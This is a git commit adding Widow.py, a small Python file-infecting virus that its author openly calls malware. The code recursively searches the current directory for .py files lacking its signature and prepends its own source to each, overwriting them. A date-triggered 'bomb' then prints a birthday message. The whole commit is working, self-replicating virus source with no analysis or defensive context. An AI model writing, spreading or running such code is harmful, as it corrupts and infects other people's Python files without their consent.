bce9faabaf222e95db727d36b21183b4dbbbc751
Venom37222 <66658770+Venom37222@users.noreply.github.com>
2020-08-20 23:39:09 +0530

    Create Widow.py
    actually this malware is named after my best friend...

---
+++ Widow.py
@@ -0,0 +1,40 @@
+#!/usr/bin/python
+import os
+import datetime
+SIGNATURE = ("WIDOW PYTHON VIRUS")
+def search(path):
+    filestoinfect = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            filestoinfect.extend(search(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break;
+
+            if infected == False:
+                filestoinfect.append(path+"/"+fname)
+    return filestoinfect
+def infect(filestoinfect):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if i>=0 and i <39:
+            virusstring += line
+    virus.close
+    for fname in filestoinfect:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+def bomb():
+    if datetime.datetime.now().month == 7 and datetime.datetime.now().day == 20:
+       print ('HAPPY BIRTHDAY WIDOW!')
+filestoinfect= search(os.path.abspath(""))
+infect(filestoinfect)
+bomb()
